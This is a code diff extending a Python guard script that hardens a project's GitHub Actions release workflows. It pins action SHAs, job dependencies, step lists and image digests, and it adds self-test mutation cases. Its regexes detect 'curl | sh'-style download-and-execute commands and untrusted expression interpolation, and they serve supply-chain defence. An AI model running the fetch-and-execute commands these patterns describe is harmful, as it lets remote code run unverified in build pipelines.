@@ -253,6 +253,8 @@ USES_CONSTANTS = {
     IMAGE_BUILD_USES: "IMAGE_BUILD_USES",
     ATTEST_USES: "ATTEST_USES",
 }
+# #8030: the action each constant pins, so every `uses:` of that action is compared to it.
+USES_BY_ACTION = {const.split("@", 1)[0]: const for const in USES_CONSTANTS}
 DOCKER_JOB: Dict[str, Spec] = {
     "name": "Docker (GHCR)",
     "needs": Flow("preflight, qualify, supply-chain"),
@@ -308,6 +310,23 @@ RELEASE_JOB_PERMISSIONS: Dict[str, Optional[Dict[str, Spec]]] = {
     "docker": dict(DOCKER_JOB["permissions"]),  # type: ignore[arg-type]
     "copr": dict(_READ_ATTEST),
 }
+# Every job's `needs:` edges, pinned (#6289): a publish job that dropped its
+# supply-chain / release gate would run before (or without) it. preflight is the
+# root and carries no `needs:`; docker reuses its whole-job pin.
+_PQS = Flow("preflight, qualify, supply-chain")
+_PQR = Flow("preflight, qualify, release")
+RELEASE_JOB_NEEDS: Dict[str, Spec] = {
+    "qualify": "preflight",
+    "supply-chain": Flow("preflight, qualify"),
+    "release": _PQS,
+    "sbom": _PQS,
+    "mobile-ios": _PQS,
+    "mobile-android": _PQS,
+    "crates-io": _PQR,
+    "homebrew": _PQR,
+    "docker": DOCKER_JOB["needs"],
+    "copr": _PQR,
+}
 # The only secrets release.yml may read: a new credential (a registry token in
 # another job) is refused until it is added here on purpose.
 RELEASE_SECRETS = ("GITHUB_TOKEN", "CARGO_REGISTRY_TOKEN", "HOMEBREW_TAP_TOKEN", "COPR_CONFIG")
@@ -333,6 +352,76 @@ SHAPE_JOB: Dict[str, Spec] = {
     "runs-on": "ubuntu-latest",
     "timeout-minutes": "60",
 }
+
+
+class Unit(str):
+    """A SHAPE_STEPS slot filled by a statement-list unit (SHAPE_BUILD / SHAPE_PROOF)."""
+
+
+# #6290: the release-shape job's ordered step list is pinned WHOLE. The build and
+# proof slots are the statement-list units; every other step is compared key by
+# key, so no step carries an `if:`, `continue-on-error:` or `timeout-minutes:` the
+# list does not pin (only the cleanup step runs `if: always()`), and none can be
+# added, dropped or reordered.
+SHAPE_STEPS: List[Spec] = [
+    {"uses": CHECKOUT_USES},
+    {"name": "Install Rust 1.98.0 (matches rust-toolchain.toml pin)", "uses": "dtolnay/rust-toolchain@f8be11a05b1d4f3fcebe6410cc16743212b999b0"},
+    {"uses": "Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6"},
+    {"name": "Release feature declaration guard", "run": "python3 scripts/check_release_features.py"},
+    Unit("build"),
+    {"name": "No OpenSSL / libpq / native-tls in the shipped dependency graph", "shell": "bash",
+     "run": Block((
+         'set -euo pipefail',
+         'FEATURES="$(bash scripts/release-features.sh)"',
+         'test -n "$FEATURES"',
+         'tree="$(cargo tree --locked -e normal --target all --features "$FEATURES")"',
+         'if printf \'%s\\n\' "$tree" | grep -E \'(^|[^a-z-])(openssl-sys|native-tls|openssl |libpq)\'; then',
+         '  echo "::error::the release feature set pulls a native TLS / libpq dependency (#4480 requires pure-Rust rustls)"',
+         '  exit 1',
+         'fi',
+         'echo "no openssl-sys / native-tls / libpq in the release dependency graph"',
+     ))},
+    {"name": "Start a TLS PostgreSQL service (throwaway CA, hostssl-only)", "shell": "bash",
+     "run": Block((
+         'set -euo pipefail',
+         'd="$RUNNER_TEMP/pgtls"',
+         'mkdir -p "$d"',
+         'cd "$d"',
+         'openssl req -x509 -newkey rsa:2048 -nodes -days 1 -subj "/CN=release-shape-ca" -keyout ca.key -out ca.crt',
+         'openssl req -newkey rsa:2048 -nodes -subj "/CN=127.0.0.1" -keyout server.key -out server.csr',
+         "printf 'subjectAltName=IP:127.0.0.1,DNS:localhost\\n' > san.ext",
+         'openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 1 -extfile san.ext -out server.crt',
+         '# hostssl ONLY on TCP: a plaintext login cannot succeed, so a green',
+         '# round trip proves the session was TLS.',
+         "printf 'local all all trust\\nhostssl all all all scram-sha-256\\n' > pg_hba.conf",
+         'sudo chown 999:999 server.key server.crt pg_hba.conf',
+         'sudo chmod 600 server.key',
+         'pw="$(openssl rand -hex 16)"',
+         'echo "::add-mask::$pw"',
+         'echo "PGTLS_DIR=$d" >> "$GITHUB_ENV"',
+         'echo "PGTLS_PW=$pw" >> "$GITHUB_ENV"',
+         '# Image: pgvector/pgvector 0.8.6-pg18 (canonical PostgreSQL 18.6 + pgvector 0.8.6',
+         '# stack of the repo SSOT), pinned by digest; no Apache AGE in this image.',
+         'docker run -d --name release-shape-pg -p 127.0.0.1:55432:5432 -e POSTGRES_PASSWORD="$pw" -e POSTGRES_DB=proof -v "$d:/certs:ro" pgvector/pgvector@sha256:2ba9ca5f2e7daa0f0e7723cba1ee9167bab54efd3640516a44ac1a928dd67e7a -c ssl=on -c ssl_cert_file=/certs/server.crt -c ssl_key_file=/certs/server.key -c hba_file=/certs/pg_hba.conf',
+         'for _ in $(seq 1 60); do',
+         '  if docker exec release-shape-pg pg_isready -U postgres -d proof >/dev/null 2>&1; then',
+         '    ready=1; break',
+         '  fi',
+         '  sleep 2',
+         'done',
+         'if [ "${ready:-0}" != 1 ]; then',
+         '  docker logs release-shape-pg || true',
+         '  echo "::error::the TLS PostgreSQL service did not become ready (the proof must not pass vacuously)"',
+         '  exit 1',
+         'fi',
+         "docker exec release-shape-pg psql -U postgres -d proof -v ON_ERROR_STOP=1 -c 'CREATE EXTENSION IF NOT EXISTS vector;'",
+     ))},
+    Unit("proof"),
+    {"name": "Stop the PostgreSQL service", "if": "always()", "shell": "bash",
+     "run": "docker rm -f release-shape-pg >/dev/null 2>&1 || true"},
+]
+SHAPE_STEP_ROLES = ("checkout", "toolchain", "build cache", "feature declaration guard", "release-shaped build",
+                    "native TLS check", "TLS PostgreSQL service", "PG proof", "PostgreSQL cleanup")
 # #4480 ruled the release-shape job ADVISORY until its first green run on main; #4720
 # tracks the flip to required. While True the job must carry exactly the plain
 # `continue-on-error: true`; the #4720 fix sets this to False in the same commit
@@ -518,6 +607,7 @@ def first_diff(got: Tuple[str, ...], want: Tuple[str, ...]) -> str:
 class Report:
     def __init__(self) -> None:
         self.errors: List[str] = []
+        self.root: Optional[Path] = None  # the tree being checked (local actions are read from it)
 
     def bad(self, msg: str) -> None:
         self.errors.append(msg)
@@ -1050,6 +1140,20 @@ def check_docker_job(jobs: Node, rep: Report) -> None:
             rep.bad(msg)
 
 
+def check_job_needs(name: str, job: Node, rep: Report) -> None:
+    """#6289: the job's `needs:` is exactly RELEASE_JOB_NEEDS[name]; the root job has none."""
+    needs = RELEASE_JOB_NEEDS.get(name)
+    if needs is None:
+        if job.get("needs") is not None:
+            rep.bad(pin_message("release.yml", f"`jobs.{name}` carries a `needs:` and is pinned to have none (#6289)",
+                                "RELEASE_JOB_NEEDS"))
+        return
+    why = pin_problem(job.get("needs"), needs, f"jobs.{name}.needs")
+    if why:
+        rep.bad(pin_message("release.yml", why + " (a dropped edge lets the job run before its gate, #6289)",
+                            "RELEASE_JOB_NEEDS"))
+
+
 def check_release_permissions(doc: Node, jobs: Node, rep: Report) -> None:
     """The job set and every job's `permissions:` are pinned; `packages: write`
     is the docker job's alone (#4719 SR-8)."""
@@ -1067,6 +1171,7 @@ def check_release_permissions(doc: Node, jobs: Node, rep: Report) -> None:
             continue
         if job.get("uses") is not None:
             rep.bad(f"release.yml: `jobs.{name}` calls a reusable workflow (`uses:`), which the guard cannot read")
+        check_job_needs(name, job, rep)
         perms = job.get("permissions")
         if want is None:
             if perms is not None:
@@ -1118,6 +1223,225 @@ def check_run_continuations(doc: Node, label: str, rep: Report) -> None:
                         f"guard refuses continuations in run text): {text.strip()[:70]}")
 
 
+# #6904: a `uses:` names an action by a full 40-hex commit sha (a tag, a branch
+# or a short ref can be re-pointed); a local `./` action and a docker image by
+# sha256 digest are the only other forms.
+USES_PINNED_RE = re.compile(r"\./[A-Za-z0-9_./-]+|docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}"
+                            r"|[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9_./-]+@[0-9a-f]{40}")
+
+
+# Round 5 (F2): a container or service image is pinned by digest, as a `docker://` use is.
+IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")
+DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")
+# Round 5 (F4): a `run:` never downloads and executes, and never splices an attacker-influenced
+# expression into the script text (it belongs in `env:` and is quoted in the script).
+EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
+UNTRUSTED_RE = re.compile(r"(?<![\w.-])(?:github\s*\.\s*(?:event|head_ref|ref_name)(?![\w-])"
+                          r"|github\s*\[\s*['\"](?:event|head_ref|ref_name)|inputs(?![\w-]))", re.I)
+_FETCH = r"(?<![\w.-])(?:curl|wget)(?![\w-])"
+EXEC_WORD_RE = re.compile(r"(?<![\w.-])(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php|eval|source)(?![\w-])|^\s*\.\s", re.I)
+PIPE_EXEC_RE = re.compile(_FETCH + r"[^|\n]*\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)*(?:\S*/)?(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php)(?![\w-])", re.I)
+SUBST_FETCH_RE = re.compile(r"(?:\$\(|<\(|`)\s*" + _FETCH, re.I)
+MAX_LOCAL_DEPTH = 8  # nested local composite actions followed before a chain is refused
+
+
+def uses_where(doc: Node, path: Tuple[str, ...]) -> str:
+    """#8021: the job and the step a `uses:` at ``path`` belongs to (never only a line number)."""
+    if len(path) >= 2 and path[0] == "jobs":
+        where = f"job `{path[1]}`"
+        if len(path) >= 5 and path[2] == "steps" and path[3].isdigit():
+            where += f" step {int(path[3]) + 1}"  # #8031: 1-based, as the #6290 `steps.N` messages
+            jobs = doc.get("jobs")
+            job = jobs.get(path[1]) if jobs is not None else None
+            steps = job.get("steps") if job is not None else None
+            if steps is not None and steps.kind == "seq" and isinstance(steps.value, list):
+                idx = int(path[3])
+                step = steps.value[idx] if idx < len(steps.value) else None
+                label = step.get("name") if step is not None else None
+                if label is not None and label.kind == "scalar":
+                    where += f" ({label.text().strip()[:50]})"
+        return where
+    return "path `" + ".".join(path) + "`"
+
+
+def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chain: Tuple[Path, ...]) -> None:
+    """One `uses:` value: pinned (USES_PINNED_RE), compared per action (#8030, Round 5 F1), and a local
+    action is opened and inspected (Round 5 F5)."""
+    ref = node.text().strip()
+    if node.kind != "scalar" or not USES_PINNED_RE.fullmatch(ref):
+        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` is not pinned to a "
+                "full 40-hex commit sha (#6904: a tag, branch or short ref can be re-pointed)"
+                + pin_hint("USES_PINNED_RE"))
+        return
+    # #8030 (the #6904 acceptance): where a *_USES constant exists for the action, the ref must
+    # equal it exactly; another 40-hex sha is an unreviewed commit. release.yml's docker job is
+    # pinned whole by DOCKER_STEPS, which already names the constant, so it is not reported twice.
+    # Round 5 (F1): GitHub resolves owner and repository case-insensitively and runs a subpath of the
+    # repository, so the action is keyed on the lower-cased first two path components and the pinned
+    # sha must be the allowlisted one for that key whatever spelling or subpath the ref uses.
+    spec, _, sha = ref.partition("@")
+    if ref.startswith("./"):
+        check_local_action(ref, node, name, where, rep, chain)
+        return
+    if spec.startswith("docker://"):
+        return
+    segs = spec.split("/")
+    if any(seg in ("", ".", "..") for seg in segs):
+        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` has an empty, `.` or "
+                "`..` path segment (a normalised path can name another action than the one reviewed)")
+        return
+    want = USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))
+    if want is not None and sha != want.partition("@")[2] and not exempt:
+        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` differs from "
+                f"{USES_CONSTANTS[want]} (`{want}`; #6904: a per-action constant comparison on the "
+                "case-folded owner/repo, any subpath kept)" + pin_hint(USES_CONSTANTS[want]))
+
+
+def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report, chain: Tuple[Path, ...]) -> None:
+    """Round 5 (F5): a local `./path` action is loaded from the checked-out tree and held to the same rules."""
+    rel = ref[2:]
+    here = f"{name}: {where}: line {node.line + 1}: local action `{rel}`"
+    if rep.root is None:
+        rep.bad(f"{here} cannot be inspected (no checked-out tree to read it from)")
+        return
+    tree = rep.root.resolve()
+    target = (tree / rel).resolve()
+    if tree != target and tree not in target.parents:
+        rep.bad(f"{here} resolves outside the checked-out tree")
+        return
+    if target in chain:
+        rep.bad(f"{here} is part of a cycle of local actions")
+        return
+    if len(chain) >= MAX_LOCAL_DEPTH:
+        rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep")
+        return
+    action = next((target / f for f in ("action.yml", "action.yaml") if (target / f).is_file()), None)
+    if action is None:
+        rep.bad(f"{here} has no action.yml or action.yaml (a local action that cannot be read is not inspected)")
+        return
+    label = f"{rel}/{action.name}"
+    text = load(action, label, rep, True)
+    if text is None:
+        return
+    adoc = parse_yaml(text, label, rep)
+    if adoc is None:
+        return
+    runs = adoc.get("runs")
+    using = runs.get("using") if runs is not None else None
+    kind = using.text().strip() if using is not None and using.kind == "scalar" else ""
+    if kind == "composite":
+        steps = runs.get("steps") if runs is not None else None
+        if steps is None or steps.kind != "seq" or not steps.value:
+            rep.bad(f"{here}: `runs.steps` must be a non-empty list")
+            return
+        for i, step in enumerate(steps.value):
+            where_step = f"local action `{rel}` step {i + 1}"
+            if step.kind != "map":
+                rep.bad(f"{label}: {where_step}: line {step.line + 1}: a step must be a mapping")
+                continue
+            uses = step.get("uses")
+            if uses is not None:
+                check_ref(uses, label, where_step, rep, False, chain + (target,))
+            check_run(step, label, where_step, rep)
+    elif kind == "docker":
+        image = runs.get("image") if runs is not None else None
+        if image is None or image.kind != "scalar" or not DOCKER_USES_RE.fullmatch(image.text().strip()):
+            rep.bad(f"{here}: `runs.image` must be a `docker://...@sha256:<64 hex>` image")
+    elif kind.startswith("node"):
+        main = runs.get("main") if runs is not None else None
+        entry = (target / main.text().strip()).resolve() if main is not None and main.kind == "scalar" else None
+        if entry is None or (target != entry and target not in entry.parents) or not entry.is_file():
+            rep.bad(f"{here}: `runs.main` must name a file inside the action directory")
+    else:
+        rep.bad(f"{here}: `runs.using` must be `composite`, `docker` or `node*` (got `{kind[:30]}`)")
+
+
+def check_run(step: Node, name: str, where: str, rep: Report) -> None:
+    """Round 5 (F4): no download-and-execute and no attacker-influenced expression in a `run:` script."""
+    run = step.get("run")
+    if run is None:
+        return
+    if run.kind == "block" and isinstance(run.value, list):
+        raw, logical = "\n".join(run.value), logical_lines(run.value)
+    elif run.kind == "scalar":
+        raw, logical = run.text(), logical_lines([run.text()])
+    else:
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` must be a scalar or a block (got {run.kind})")
+        return
+    for m in EXPR_RE.finditer(raw):
+        if UNTRUSTED_RE.search(m.group(1)):
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}` into the script "
+                    "(Round 5: pass an attacker-influenced value through `env:` and quote it in the script)")
+    for ln in logical:
+        if PIPE_EXEC_RE.search(ln) or (SUBST_FETCH_RE.search(ln) and EXEC_WORD_RE.search(ln)):
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` downloads and executes: `{ln[:60]}` "
+                    "(Round 5: download to a file, verify its digest, then run it)")
+
+
+def check_images(job: Node, name: str, jname: str, rep: Report) -> None:
+    """Round 5 (F2): every container and service image of a job is pinned by digest."""
+    where = f"{name}: job `{jname}`"
+    container = job.get("container")
+    if container is not None:
+        image = container if container.kind == "scalar" else container.get("image") if container.kind == "map" else None
+        if image is None or image.kind != "scalar" or not IMAGE_DIGEST_RE.fullmatch(image.text().strip()):
+            rep.bad(f"{where}: line {container.line + 1}: `container` image must be pinned by digest "
+                    "(`name@sha256:<64 hex>`; a tag or a bare name can be re-pointed)")
+    services = job.get("services")
+    if services is None:
+        return
+    if services.kind != "map":
+        rep.bad(f"{where}: line {services.line + 1}: `services` must be a mapping of pinned images")
+        return
+    for sname, service in services.value.items():  # type: ignore[union-attr]
+        image = service.get("image") if service.kind == "map" else None
+        if image is None or image.kind != "scalar" or not IMAGE_DIGEST_RE.fullmatch(image.text().strip()):
+            rep.bad(f"{where}: line {service.line + 1}: `services.{sname}.image` must be pinned by digest "
+                    "(`name@sha256:<64 hex>`; a tag or a bare name can be re-pointed)")
+
+
+def check_jobs_shape(doc: Node, name: str, rep: Report) -> None:
+    """Round 5 (F3, F2, F4): the shape of `jobs`, each job, its `needs`, `steps` and steps, then images and run text."""
+    jobs = doc.get("jobs")
+    if jobs is None or jobs.kind != "map" or not jobs.keys():
+        rep.bad(f"{name}: `jobs:` must be a non-empty mapping (got {'nothing' if jobs is None else jobs.kind})")
+        return
+    for jname, job in jobs.value.items():  # type: ignore[union-attr]
+        where = f"{name}: job `{jname}`"
+        if job.kind != "map":
+            rep.bad(f"{where}: line {job.line + 1}: a job must be a mapping (got {job.kind})")
+            continue
+        needs = job.get("needs")
+        if needs is not None and not (needs.kind == "scalar" or (
+                needs.kind == "seq" and all(n.kind == "scalar" for n in needs.value))):  # type: ignore[union-attr]
+            rep.bad(f"{where}: line {needs.line + 1}: `needs` must be a string or a list of strings")
+        check_images(job, name, jname, rep)
+        steps = job.get("steps")
+        if job.get("uses") is not None and steps is None:
+            continue  # a reusable-workflow job has no steps; its `uses` is pinned by check_ref
+        if steps is None or steps.kind != "seq" or not steps.value:
+            rep.bad(f"{where}: `steps` must be a non-empty list (got {'nothing' if steps is None else steps.kind})")
+            continue
+        for i, step in enumerate(steps.value):  # type: ignore[union-attr]
+            if step.kind != "map":
+                rep.bad(f"{where} step {i + 1}: line {step.line + 1}: a step must be a mapping (got {step.kind})")
+                continue
+            check_run(step, name, f"job `{jname}` step {i + 1}", rep)
+
+
+def check_uses_pinned(doc: Node, name: str, rep: Report) -> None:
+    """#6904: every `uses:` of every job and step is pinned (USES_PINNED_RE).
+
+    Called for release.yml, release-shape.yml, c8-precheck.yml and
+    publish-ci-image.yml (#8002, #8020): each refusal names the job and step.
+    Round 5 adds the workflow-shape, image, `run:` and local-action checks of one workflow."""
+    for path, node in walk(doc):
+        if not path or path[-1] != "uses":
+            continue
+        check_ref(node, name, uses_where(doc, path), rep, name == "release.yml" and path[:2] == ("jobs", "docker"), ())
+    check_jobs_shape(doc, name, rep)
+
+
 def check_release_yml(text: str, rep: Report) -> None:
     check_no_bash_env("release.yml", text, rep)
     check_text_counts(text, rep)
@@ -1126,6 +1450,7 @@ def check_release_yml(text: str, rep: Report) -> None:
         return
     check_blocks(doc, "release.yml", rep)
     check_run_continuations(doc, "release.yml", rep)
+    check_uses_pinned(doc, "release.yml", rep)
     check_secrets_and_registry(doc, rep)
     for key in doc.keys():
         if key not in TOP_KEYS:
@@ -1274,6 +1599,7 @@ def check_shape(text: str, rep: Report, advisory: Optional[bool] = None) -> None
         return
     check_blocks(doc, "release-shape.yml", rep)
     check_run_continuations(doc, "release-shape.yml", rep)
+    check_uses_pinned(doc, "release-shape.yml", rep)
     if doc.keys() != list(SHAPE_TOP_KEYS):
         rep.bad(pin_message("release-shape.yml", f"top-level keys {doc.keys()} differ from the pinned "
                             f"{list(SHAPE_TOP_KEYS)} (a top-level `defaults:` or `env:` change redirects every step)",
@@ -1316,6 +1642,30 @@ def check_shape(text: str, rep: Report, advisory: Optional[bool] = None) -> None
                       rep, "SHAPE_PROOF", _shape_norm)
     if builds and proofs and proofs[0] < builds[0]:
         rep.bad("release-shape.yml: the pg proof must run after the release-shaped build, in the same job")
+    # #6290: the whole ordered step list is pinned (SHAPE_STEPS).
+    items = [st for _, st in steps]
+    raw = job.get("steps")
+    if raw is None or raw.kind != "seq" or not isinstance(raw.value, list) or len(items) != len(raw.value):
+        rep.bad(pin_message("release-shape.yml", "`jobs.release-shape.steps` is missing, not a sequence or holds a "
+                            "non-mapping step", "SHAPE_STEPS"))
+        return
+    if len(items) != len(SHAPE_STEPS):
+        rep.bad(pin_message("release-shape.yml", f"the release-shape job has {len(items)} steps, the pinned list has "
+                            f"{len(SHAPE_STEPS)} (an extra step can replace the proven binary or the proof script; a "
+                            "missing one skips a control)", "SHAPE_STEPS"))
+        return
+    units = {"build": builds, "proof": proofs}
+    for n, (step, spec) in enumerate(zip(items, SHAPE_STEPS)):
+        if isinstance(spec, Unit):
+            if units[str(spec)] != [n]:
+                rep.bad(pin_message("release-shape.yml", f"`jobs.release-shape.steps.{n + 1}` must be the {spec} unit "
+                                    f"({SHAPE_STEP_ROLES[n]}); the proof runs after the build, in the same job",
+                                    "SHAPE_STEPS"))
+            continue
+        why = pin_problem(step, spec, f"jobs.release-shape.steps.{n + 1} ({SHAPE_STEP_ROLES[n]})")
+        if why:
+            rep.bad(pin_message("release-shape.yml", why + " (#6290: no step may carry an unpinned `if:`, "
+                                "`continue-on-error:` or `timeout-minutes:`)", "SHAPE_STEPS"))
 
 
 def check_install(text: str, rep: Report) -> None:
@@ -1329,9 +1679,12 @@ def check_install(text: str, rep: Report) -> None:
 
 def run_guard(root: Path, advisory: Optional[bool] = None) -> Tuple[List[str], str]:
     rep = Report()
+    rep.root = root
     feat = load(root / "scripts" / "release-features.sh", "scripts/release-features.sh", rep, False)
     rel = load(root / ".github" / "workflows" / "release.yml", ".github/workflows/release.yml", rep, True)
     shape = load(root / ".github" / "workflows" / "release-shape.yml", ".github/workflows/release-shape.yml (no release-shaped proof)", rep, True)
+    c8 = load(root / ".github" / "workflows" / "c8-precheck.yml", ".github/workflows/c8-precheck.yml (#8002)", rep, True)
+    publish = load(root / ".github" / "workflows" / "publish-ci-image.yml", ".github/workflows/publish-ci-image.yml (#8020)", rep, True)
     docker = load(root / "Dockerfile", "Dockerfile", rep, True)
     install = load(root / "docs" / "INSTALL.md", "docs/INSTALL.md", rep, False)
 
@@ -1356,6 +1709,11 @@ def run_guard(root: Path, advisory: Optional[bool] = None) -> Tuple[List[str], s
         check_release_yml(rel, rep)
     if docker is not None:
         check_dockerfile(docker, rep)
+    for wf_name, wf_text in (("c8-precheck.yml", c8), ("publish-ci-image.yml", publish)):
+        if wf_text is not None:
+            wf_doc = parse_yaml(wf_text, wf_name, rep)
+            if wf_doc is not None:
+                check_uses_pinned(wf_doc, wf_name, rep)
     if shape is not None:
         check_shape(shape, rep, advisory)
     if install is not None:
@@ -1371,7 +1729,9 @@ SHAPE = ".github/workflows/release-shape.yml"
 DOCKER = "Dockerfile"
 INSTALL = "docs/INSTALL.md"
 DECL = "scripts/release-features.sh"
-INPUT_FILES = (REL, SHAPE, DOCKER, INSTALL, DECL)
+C8 = ".github/workflows/c8-precheck.yml"
+PUBLISH = ".github/workflows/publish-ci-image.yml"
+INPUT_FILES = (REL, SHAPE, C8, PUBLISH, DOCKER, INSTALL, DECL)
 
 
 def mutate_file(path: Path, old: str, new: Union[str, None, Transform], every: bool = False) -> None:
@@ -1384,6 +1744,7 @@ def mutate_file(path: Path, old: str, new: Union[str, None, Transform], every: b
         path.write_text(new(path.read_text(encoding="utf-8")), encoding="utf-8")
         return
     if old == "":
+        path.parent.mkdir(parents=True, exist_ok=True)
         path.write_bytes(new.encode("utf-8", "surrogateescape"))
         return
     text = path.read_text(encoding="utf-8")
@@ -1595,6 +1956,47 @@ def _docker_steps_scalar(text: str) -> str:
     a, c = text.index("\n  docker:\n"), text.index("\n  copr:\n")
     s = text.index("    steps:\n", a)
     return text[:s] + "    steps: none\n" + text[c:]
+
+
+def _job_edit(job: str, fn: Callable[[str], str]) -> Transform:
+    """A Transform that rewrites only the body of workflow job ``job`` (#8023 cells)."""
+    def go(text: str) -> str:
+        m = re.search(r"(?m)^  " + re.escape(job) + r":\n(?:(?!^  [A-Za-z0-9_-]+:\n).*\n?)*", text)
+        if m is None:
+            raise InputError(f"self-test: job {job} not found")
+        return text[:m.start()] + fn(m.group(0)) + text[m.end():]
+    return go
+
+
+_SHA_USES_RE = re.compile(r"(uses:\s*[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@)[0-9a-f]{40}")
+
+
+def _first_use_to_tag(text: str) -> str:
+    """Repoint the first pinned `uses:` of a workflow to the mutable tag v4 (#6904)."""
+    return _SHA_USES_RE.sub(r"\g<1>v4", text, count=1)
+
+
+def _first_checkout_to_other_sha(text: str) -> str:
+    """Repin the first actions/checkout to another valid 40-hex sha (#8030)."""
+    return re.sub(r"(uses:\s*actions/checkout@)[0-9a-f]{40}", r"\g<1>" + "0" * 40, text, count=1)
+
+
+def _checkout_spelled(spelling: str, sha: str = "0" * 40) -> Callable[[str], str]:
+    """Respell the first actions/checkout of a job text as ``spelling@sha`` (Round 5 F1)."""
+    def go(text: str) -> str:
+        return text.replace(CHECKOUT_USES, spelling + "@" + sha, 1)
+    return go
+
+
+def _shape_scalar_step(text: str) -> str:
+    return text.rstrip("\n") + "\n      - just-a-scalar\n"
+
+
+def _shape_swap_guard_build(text: str) -> str:
+    a = text.index("      - name: Release feature declaration guard\n")
+    b = text.index("      - name: Build release binary")
+    c = text.index("      - name: No OpenSSL")
+    return text[:a] + text[b:c] + text[a:b] + text[c:]
 
 
 def _shape(old: str, new: Union[str, Transform]) -> Edit:
@@ -1826,6 +2228,48 @@ CASES: Dict[str, Tuple[str, List[Edit]]] = {
     "L1 Dockerfile is missing": ("fail", [(DOCKER, "", None, False)]),
     "L1 release-shape.yml is missing": ("fail", [(SHAPE, "", None, False)]),
     "L1 docs/INSTALL.md is missing": ("fail", [(INSTALL, "", None, False)]),
+    "L1 c8-precheck.yml is missing": ("fail", [(C8, "", None, False)]),
+    "L1 publish-ci-image.yml is missing": ("fail", [(PUBLISH, "", None, False)]),
+    # Round-2 cells (#8023): one per refusal site the #6289 / #6290 / #6904 / #8002 / #8020 fixes add.
+    "N1 root job preflight gains needs is refused": ("fail", [
+        _rel("", _job_edit("preflight", lambda b: b.replace("  preflight:\n", "  preflight:\n    needs: qualify\n", 1)))]),
+    "N2 homebrew needs drops release is refused": ("fail", [
+        _rel("", _job_edit("homebrew", lambda b: b.replace("needs: [preflight, qualify, release]", "needs: [preflight, qualify]", 1)))]),
+    "N3 release.yml preflight uses repointed to a tag is refused": ("fail", [
+        _rel("", _job_edit("preflight", _first_use_to_tag))]),
+    "N11 release.yml crates-io uses repointed to a tag is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _first_use_to_tag))]),
+    "N4 release-shape.yml uses repointed to a tag is refused": ("fail", [(SHAPE, "", _first_use_to_tag, False)]),
+    "N5 c8-precheck.yml uses repointed to a tag is refused": ("fail", [(C8, "", _first_use_to_tag, False)]),
+    "N6 publish-ci-image.yml uses repointed to a tag is refused": ("fail", [(PUBLISH, "", _first_use_to_tag, False)]),
+    "N7 release-shape holds a non-mapping step is refused": ("fail", [(SHAPE, "", _shape_scalar_step, False)]),
+    "N8 release-shape step appended is refused": ("fail", [
+        (SHAPE, "", lambda x: x.rstrip("\n") + "\n\n      - name: x\n        run: echo\n", False)]),
+    "N10 release-shape guard step gains if: false is refused": ("fail", [
+        _shape("      - name: Release feature declaration guard\n",
+               "      - name: Release feature declaration guard\n        if: false\n")]),
+    # Round-3 cells (#8030): the per-action *_USES comparison, one cell per workflow.
+    "N12 release.yml preflight checkout repinned to another sha is refused": ("fail", [
+        _rel("", _job_edit("preflight", _first_checkout_to_other_sha))]),
+    "N13 release.yml crates-io checkout repinned to another sha is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _first_checkout_to_other_sha))]),
+    "N14 release-shape.yml checkout repinned to another sha is refused": ("fail", [
+        (SHAPE, "", _first_checkout_to_other_sha, False)]),
+    "N15 c8-precheck.yml checkout repinned to another sha is refused": ("fail", [
+        (C8, "", _first_checkout_to_other_sha, False)]),
+    "N16 publish-ci-image.yml checkout repinned to another sha is refused": ("fail", [
+        (PUBLISH, "", _first_checkout_to_other_sha, False)]),
+    "N17 c8-precheck.yml holds a value outside the subset grammar is refused": ("fail", [
+        (C8, "", lambda x: x.rstrip("\n") + '\n\nx-extra: "abc\n', False)]),
+    # Round-5 cells (F1): the per-action comparison is on the case-folded owner/repo with any subpath kept.
+    "N18 crates-io checkout spelled with another case and another sha is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("Actions/Checkout")))]),
+    "N19 crates-io checkout with a subpath and another sha is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("actions/checkout/sub")))]),
+    "N20 crates-io checkout with a dot segment is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("actions/checkout/..", CHECKOUT_USES.partition("@")[2])))]),
+    "N21 crates-io checkout spelled with another case and the pinned sha passes": ("pass", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("ACTIONS/Checkout", CHECKOUT_USES.partition("@")[2])))]),
     # --- control characters: Python and bash disagree on what a line is
     "control character: CR line ends in release.yml": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\r")]),
     "control character: form feed in the Dockerfile": ("fail", [(DOCKER, DOCKER_ASSERT, DOCKER_ASSERT + "\x0c# x", False)]),
@@ -2088,10 +2532,39 @@ MESSAGE_CASES: Dict[str, Tuple[List[Edit], int, str]] = {
                                                         "update LOGIN_USES in scripts/check_release_features.py"),
     "message: IMAGE_BUILD_USES SHA bump": ([_rel(IMAGE_BUILD_USES, IMAGE_BUILD_USES[:-1] + "0")], 1,
                                            "update IMAGE_BUILD_USES in scripts/check_release_features.py"),
